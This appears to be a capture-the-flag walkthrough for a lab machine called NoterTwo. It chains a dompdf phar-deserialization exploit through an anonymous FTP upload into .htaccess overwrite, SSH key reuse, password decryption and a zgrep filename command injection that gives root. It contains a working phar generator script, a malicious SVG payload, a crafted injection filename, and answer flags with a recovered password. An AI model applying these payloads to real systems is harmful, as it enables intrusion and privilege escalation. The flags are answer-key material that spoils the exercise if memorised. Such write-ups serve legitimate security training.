![[Boxes/02 - Medium/NoterTwo/Writeup/assets/images/banner.png]]

![[Boxes/02 - Medium/NoterTwo/Writeup/assets/images/htb.png]]


<font size="10"> Writeup </font>

​		Date: 

​		Machine Author: Kavishka Gihan 


# Description:

NoterTwo is an Easy Linux machine that show cases a Note-taking application that includes a CVE in dompdf that exploits a php deserialization attack which allows  users to overwrite a `.htaccess` file allowing users to download arbitrary files from a restricted file server. This gives users a ssh key to login as a certain user. Once in the server, there is an encrypted password file (of that same user) which the players will have to decrypt using the ssh key they got. For root, we exploit yet another CVE in GZIP that allows users to get command injection as the root user. 

### Flags:

User: `a19ad0bf2f80267fbcbef40716e79911`

Root: `11555167ff48f47d315244b9b785dea6`

# User

Initial nmap tells us there are 3 ports open as 21,22 and 80. 

```
nmap --open 192.168.1.5
```

![[Screenshots/Pasted image 20230328185747.png]]

Visiting port 80, we see a web application.

![[Screenshots/Pasted image 20230328185451.png|700]]

Looking through around we can see there is a changelog in `/changelog`

![[Screenshots/Pasted image 20230328190055.png]]

Also, we are presented with the source code for local setups. So we can download the source code and take a look. We can see that this is a php application using the source files.

![[Screenshots/Pasted image 20230328190715.png]]

Looking at the dependencies that this application uses, we can see it is using `dompdf` version 2.0.1

![[Screenshots/Pasted image 20230328190851.png]]

Looking at the source code again, we can see dompdf is used in the application to export the notes to pdfs

![[Screenshots/Pasted image 20230328220826.png]]

If we do a quick google about dompdf version 2.0.1, we can see it is vulnerable to an **arbitrary object unserialization** vulnerability. 
- https://github.com/advisories/GHSA-3cw5-7cxw-v5qg

This POC showcases how this is exploited. Keeping this in mind, we can take a look at other files we have. Looking at `utils.php` we can see an interesting thing.

![[Screenshots/Pasted image 20230328191226.png]]

We see there is a Class called `FileMover` with a comment that says `Class to mote uploaded files from ftp`. The interesting thing about this class is that this is using `__construst()` inside it which makes it vulnerable to a deserialization vulnerability. Perfect, having the perfect way to exploit this which is the dompdf CVE, let's take a look at where this class is used in the application. Looking at the `index.php` we can see there is a route configured to `/app/admin/moveUploads` which seems to use the `FileMover` class. 

![[Screenshots/Pasted image 20230328213507.png]]

And indeed it does. According to this, a source file and a destination file is given through a POST request to this endpoint. Then, accordingly, the source file is moved to the destination file. But the problem is that this is an admin protected endpoint, only admins can access this. Not to worry, since we have the dompdf CVE in combination with the derialization vector, we should be able to trigger this regardless of whether we are admin or not. 

One more road block, if we read the dompdf CVE correctly, we see that in order for us to exploit this, we need to b able to have a `.phar` uploaded to the server. 

![[Screenshots/Pasted image 20230328215057.png]]

How do we upload a file? There are no routes configured to uploading fiiles. But we did see ftp port was open. Let's do some enumeration there to see if you can upload something to the server. 

![[Screenshots/Pasted image 20230328220128.png]]

And yes, anonymous authentication is enabled, therefore we can login as the anonymous user. Once logged in, we see thera directory called `uploads`. If you try to upload a file to that directory, we see it works perfectly fine. So now we have a way to upload files to the server. All that's left is to piece things together and get the exploit to work.

For that, first we need to create a phar file that will be executed upon exporting the notes. Before that we need some things cleared out.

One being, if we get this to work, where would we move the file we upload to? Since we don't know a specific user in the system, we can't overwrite the ssh keys either. But if you noticed, we downloaded the source code from a subdomain called `files.notertwo.htb` If we visit it, we get forbidden.

![[Screenshots/Pasted image 20230328222121.png]]

Meaning that we only can download files that we know the location and name of. Other requests are being forbidden. But how? We know apache2 is running this web server. So there is a good chance that this is using a `.htaccess` file to restrict the access as above scenario. So if we can overwrite that file, maybe we can get the server to show us what other files are there. Since the application itself  allows us admins to do this, we don't need to worry about any system level permissions

Secondly, to be able to move the files, we need to know where the files from ftp are being uploaded to and where the files are being moved to. If we do a quick google about `default ftp home directory linux` we see its telling is that its `/srv/ftp`, and since we are uploading our file to a directory called `uploades` the complete upload path should be `/srv/ftp/uploads`. Since there is a vhost called `files.notertwo.htb`, the destination directory could be `/var/www/files/` so our destination file should be `/var/www/files/.htaccess`

Now that we know all this, we can use the vulnerable `FileMover` class source code to  create a script like this that will generate us our phar file.

```php
<?php

class FileMover
{
    public $src_file;
    public $dst_path;

    public function __construct($src_file, $dst_path)
    {
        $this->src_file = $src_file;
        $this->dst_path = $dst_path;
    }

    public function __destruct()
    {
        $source = $this->src_file;
        $destination = $this->dst_path;

        if (!rename($source, $destination)) {
            return false;
        }

        return true;
    }
}

$phar = new Phar('kavi.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new FileMover('/srv/ftp/uploads/kavi', '/var/www/files/.htaccess');
$phar->setMetadata($object);
$phar->stopBuffering();
?>


```

As per the `FileMover` class, it accepts the source file as the 1st argument and the destination file as the 2nd argument.

![[Screenshots/Pasted image 20230328221257.png]]


So this phar file will be responsible for moving `/srv/ftp/uploads/kavi` (that we need to upload) to `/var/www/files/.htaccess`. Once we have the phar file created, we need to upload the `kavi.phar` and `kavi` (which is an empty file) through ftp

![[Screenshots/Pasted image 20230328223502.png]]
Then we need to start setting up the environment to exploit the dompdf CVE to execute this phar file. For that we need to startup a web serer serving a crafted image that will trigger the phar file upon conversion to a pdf.

- `android.svg`
```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 96 105">
  <Image xlink:href="phar:///srv/ftp/uploads/kavi.phar"></Image>
  <g fill="#97C024" stroke="#97C024" stroke-linejoin="round" stroke-linecap="round">
    <path d="M14,40v24M81,40v24M38,68v24M57,68v24M28,42v31h39v-31z" stroke-width="12"/>
    <path d="M32,5l5,10M64,5l-6,10 " stroke-width="2"/>
  </g>
  <path d="M22,35h51v10h-51zM22,33c0-31,51-31,51,0" fill="#97C024"/>
  <g fill="#FFF">
    <circle cx="36" cy="22" r="2"/>
    <circle cx="59" cy="22" r="2"/>
  </g>
</svg>
```

Here note that the `href` attribute is set to the location of the phar file. 

Now we need to create a note embedding a image tag pointing to our malicious image.  For that we need to register a user first. Once thats done, create a note as follows.

![[Screenshots/Pasted image 20230328224251.png]]

```html
<img src="http://192.168.1.7:9090/android.svg">
```

Once the note is created, we need to export it 

![[Screenshots/Pasted image 20230328224402.png]]

You should see a hit for `android.svg` in your server which you served the malicous image.

![[Screenshots/Pasted image 20230328231450.png]]

If everything went fine, now we the `.htaccess` file in the files vhost must be overwritten, and we should be able to see the file listing.

![[Screenshots/Pasted image 20230328224543.png]]

Indeed, we do, Perfect.

So moving on, we see 2 new files other than the source code zip, a pdf file and another zip. If we look at the PDF file, we see something interesting.

![[Screenshots/Pasted image 20230328224707.png]]

Seems like its a welcome note to all the new sysadmin joined the company, Here it has mentioned something about the ssh keys. We have a link which resolves to the other zip file we saw. Extracting the zip, we get a ssh private key.

![[Screenshots/Pasted image 20230328225658.png]]

Hopefully we may be able to login using this. But we still don't know any possible usernames. We can findout which user this ssh key was created for by base64 decoding the ssh key.

```bash
cat rsa-sysadmin-1.key |grep -v 'KEY'|base64 -d|xxd
```

![[Screenshots/Pasted image 20230328225929.png]]

At the end of the decoded output, we can see there is a username as `sysadm_acc@NoterTwo` mentioned. Trying this username with this ssh key, we are able to login as `sysadm_acc` user


# Root

After you are in as `sysadm_acc`, you can see if you have any sudo permissions, but since we dont have a password for the user, we can't say for sure. Looking at the files owned by the `sysadm_acc` user, we can see there is a file in `/usr/share/credentials` thats owned by that user.

```bash
 find / -user sysadm_acc -type f 2>/dev/null
```


![[Screenshots/Pasted image 20230330195550.png]]

Having a ssh private key, its safe to assume that this may be a encrypted password of the user using the RSA key. So to test if we can decrypt this using that key we got, we can use `openssl` to convert the OpenSSH RSA we found to a format that can be used by `openssl` to decrypt this which is the PEM file format .

```bash
ssh-keygen -p -m PEM -f rsa-sysadmin-1.key -N "" -o -P ""
```

![[Screenshots/Pasted image 20230323192256.png]]

Now we can use this to decrypt the that `encrypted.bin `file

```bash
openssl pkeyutl  -decrypt -inkey rsa-sysadmin-1.key -in sysadm_acc.encrypted -out password
```

![[Screenshots/Pasted image 20230323192454.png]]

And we get a password as `8S*SA&5AS^1(AS!H2`

Using this we can do `sudo -l`

![[Screenshots/Pasted image 20230323192549.png]]

Seems like we can run `/opt/scripts/parser.sh` as root. Looking at the file we see it takes a directory we specify and read for log files which are gzip archives and see if there are any 500 status requests (to check for server errors inside log files ie /var/log/apache2/access.log.gz).

![[Screenshots/Pasted image 20230323192713.png]]

It is using the `zgrep` binary to grep through the gzip archives. If we look at the version of the zgrep its using, we can see its using version `1.11`

![[Screenshots/Pasted image 20230323192938.png]]

If we do a quick google about `gzip 1.11 CVE` we can see that there is a [RCE vulnerability](https://www.cybersecurity-help.cz/vdb/SB2022040803) regarding this version
- https://www.synopsys.com/blogs/software-security/cyrc-vulnerability-analysis-gzip/

This article goes through over why and how this vulnerability can be exploited to gain command execution using `zgrep`.

Firstly, we need to create 2 gzip achieves, one is a normal file and another with a specially crafted name. We need to place them in a directory and specify this directory as the 1st argument to the script.

```bash
mkdir /tmp/kavi
cd /tmp/kavi
echo 'HTTP/1.1" 500'|gzip > kavi.gz # nromal file
echo 'HTTP/1.1" 500'| gzip > "$(printf '|\n;e id\n#.gz' )" # crafted filename
```

>Here you need to make sure that you include the keyword that the `zgrep` using greps for in the gzip archives which is `HTTP/1.1" 500` in this case. Otherwise, this won't be triggered.

![[Screenshots/Pasted image 20230323194250.png]]

Now finally, we just need to run the script as root.

```
sudo -u root /opt/scripts/parser.sh /tmp/root
```

![[Screenshots/Pasted image 20230323194618.png]]

And we got command execution as root!


HashX{0p3nSSH_RSA_sys@dm!n_k3y}

HashX{D3F!ATE_gz1p_zgr3p_p@tt3rn}